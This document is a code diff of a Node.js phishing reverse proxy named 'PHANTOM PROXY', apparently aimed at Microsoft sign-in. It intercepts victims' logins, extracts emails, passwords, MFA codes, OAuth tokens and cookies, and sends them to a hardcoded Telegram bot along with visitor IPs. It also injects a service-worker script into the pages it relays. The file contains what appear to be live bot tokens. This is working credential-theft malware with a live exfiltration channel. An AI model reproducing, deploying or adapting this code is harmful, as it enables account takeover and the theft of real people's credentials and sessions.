@@ -1,8 +1,8 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.3.1 — CLEAN TELEGRAM LOGS
+// 🥔 PHANTOM PROXY v10.3 — FIXED SW REGISTRATION
 // ============================================================
-// 🔥 Pure Node.js — no Express
-// ✅ No raw response body logging to Telegram
+// 🔥 NO EXPRESS — pure Node.js
+// ✅ All features + Service Worker injection
 // ============================================================
 
 const http = require("http");
@@ -21,7 +21,7 @@ try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
 // ── ✅ TELEGRAM CONFIG ──
-const BOT_TOKEN = '8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg';
+const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
 const CHAT_ID = '7310383191';
 
 // ── ✅ DASHBOARD AUTH ──
@@ -49,7 +49,7 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "Y/UK2o2ewdw96T/h/34GSAuz2xMIyeRQzO2JXmAe8Vk=";
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "";
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
 const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
@@ -117,7 +117,7 @@ function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * US
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
 // ============================================================
-// 📤 TELEGRAM EXFILTRATION (NO BINARY BODY LOGGING)
+// 📤 TELEGRAM EXFILTRATION
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
@@ -205,7 +205,7 @@ async function sendToTelegram(data) {
 }
 
 // ============================================================
-// 🧩 PROXY HELPERS (unchanged)
+// 🧩 PROXY HELPERS
 // ============================================================
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
@@ -266,7 +266,24 @@ async function encryptData(data) {
     });
 }
 
-// ── Cookie management ──
+async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
+    const transaction = {
+        timestamp: new Date().toISOString(),
+        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
+        proxyRequestMethod: proxyRequestOptions.method,
+        proxyRequestHeaders: proxyRequestOptions.headers,
+        proxyRequestBody: proxyRequestBody,
+        proxyResponseStatusCode: proxyResponse.statusCode,
+        proxyResponseHeaders: proxyResponse.headers
+    };
+    const logFileStream = LOG_FILE_STREAMS[currentSession];
+    const encrypted = await encryptData(JSON.stringify(transaction));
+    if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
+        await new Promise(resolve => logFileStream.once("drain", resolve));
+    }
+}
+
+// ── Cookie management (unchanged) ──
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
     if (sCookie.length < 2) return false;
@@ -788,6 +805,7 @@ const server = http.createServer(async (req, res) => {
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
+    // Remove leading /dash if present, so we can match /api/...
     let apiPath = url;
     if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');
 
@@ -1885,7 +1903,7 @@ function proxyHandler(req, res) {
 // ── Start auto-refresh ──
 refreshTokensDaemon();
 
-// ── The actual proxy server ──
+// ── The actual proxy server (with page‑load notification + SW registration) ──
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
@@ -1919,25 +1937,29 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
 </script>`;
 
+            // Inject before </head>
             html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
 
-            // ── Send page‑load notification (clean, no binary) ──
+            // ── Send page‑load notification ──
             (async () => {
                 try {
                     const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
+                    console.log(`🌐 Page-load: IP=${ip}, Session=${session}`);
                     const message = `🆕 **New Visitor (Page Load)!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'Markdown'
                     });
+                    console.log('✅ Page-load notification sent.');
                 } catch (e) {
                     console.error('❌ Page-load notification failed:', e.message);
                 }
             })();
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            clientResponse.end(html);
+            clientResponse.end(html);  // Served modified HTML
+
         } catch (error) {
             displayError("Entry point error", error, url);
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
@@ -2088,6 +2110,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
                             VICTIM_SESSIONS[currentSession].host = locationURL.host;
                             proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
+                            console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
                         } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                     }
 
@@ -2104,7 +2127,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         .on("end", async () => {
                             let bodyBuffer = Buffer.concat(responseBody);
 
-                            // ── Extract credentials for Telegram (NO BINARY DUMPING) ──
+                            // ── Extract credentials for Telegram ──
                             let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                             try {
                                 let reqBody = proxyRequestBody;
@@ -2130,8 +2153,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         if (params.get('verificationCode')) mfa = params.get('verificationCode');
                                     }
                                 }
-                                // Extract tokens from response if present
-                                const respStr = bodyBuffer.toString('utf-8'); // safe, we only search for text patterns
+                                const respStr = bodyBuffer.toString('utf-8');
                                 const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                 if (am) tokens.access_token = am[1];
                                 const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
@@ -2153,6 +2175,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 }
                                 if (email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A' || Object.keys(tokens).length > 0 || Object.keys(cookies).length > 0) {
                                     await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
+                                } else {
+                                    console.log(`ℹ️ No credentials found in request for session ${currentSession}`);
                                 }
                             } catch (e) {
                                 console.error('❌ Telegram extraction error:', e.message);
@@ -2169,6 +2193,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                     displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                 }
                             }
+
                             // ── FederationRedirectUrl ──
                             else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                 try {
@@ -2230,11 +2255,11 @@ if (WebSocket) {
 }
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.3.1 CLEAN running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.3 FIXED running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
-    console.log(`📤 Page‑load notifications: ACTIVE (clean text only)`);
-    console.log(`📤 Telegram exfil: ACTIVE (credentials + tokens, NO binary)`);
+    console.log(`📤 Page‑load notifications: ACTIVE`);
+    console.log(`📤 Telegram exfil: ACTIVE`);
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
